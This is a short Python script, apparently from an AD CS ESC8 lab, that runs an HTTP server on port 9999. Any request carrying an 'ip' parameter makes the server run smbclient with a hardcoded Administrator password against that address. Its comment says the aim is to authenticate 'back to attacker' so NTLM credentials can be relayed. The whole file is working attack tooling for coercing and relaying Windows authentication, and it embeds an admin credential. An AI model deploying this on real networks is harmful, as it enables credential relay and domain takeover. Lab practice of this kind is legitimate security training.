import http.server
import urllib.parse
import subprocess
import threading

class TriggerHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        ip = params.get('ip', [None])[0]
        
        if ip:
            self.send_response(200)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(f"Triggering NTLM authentication to {ip}...\n".encode())
            
            # Run smbclient in a thread to prevent blocking
            def run_auth():
                # Runs smbclient back to attacker to trigger NTLM authentication relay
                subprocess.run([
                    "smbclient", f"//{ip}/share",
                    "-U", "Administrator%ESC8LabAdminPass2026!",
                    "-c", "ls"
                ], capture_output=True)
            
            threading.Thread(target=run_auth).start()
        else:
            self.send_response(400)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b"Missing 'ip' parameter.\n")

if __name__ == '__main__':
    http.server.HTTPServer(('0.0.0.0', 9999), TriggerHandler).serve_forever()
